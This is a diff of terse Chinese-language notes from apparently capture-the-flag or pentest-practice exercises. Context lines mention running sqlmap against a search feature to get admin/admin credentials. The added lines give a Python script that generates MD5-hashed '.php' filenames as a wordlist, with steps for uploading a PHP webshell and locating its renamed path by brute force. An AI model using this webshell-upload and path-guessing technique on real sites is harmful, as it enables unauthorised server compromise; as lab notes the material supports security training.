@@ -290,6 +290,29 @@ sql注入
 sqlmap梭id不行
 梭搜索功能成功
 拿到admin/admin凭证
-[嘤嘤嘤]pte1_021
+[嘤嘤嘤]pte5_6
+```python
+import hashlib
 
+  
+
+fdict = []
+
+filename = input('filename:')
+
+for i in range(1,100000):
+
+    o=hashlib.md5()
+
+    o.update((filename+str(i)).encode('utf-8'))
+
+    fdict.append(o.hexdigest()+'.php\n')
+
+with open('filedict.txt','x') as f:
+
+    f.writelines(fdict)
+```
+上传114514.php 马
+文件名形如58612212ea92229dfb02fb03026949d0.php
+找到200请求即可
 [嘤嘤嘤]pte1_021
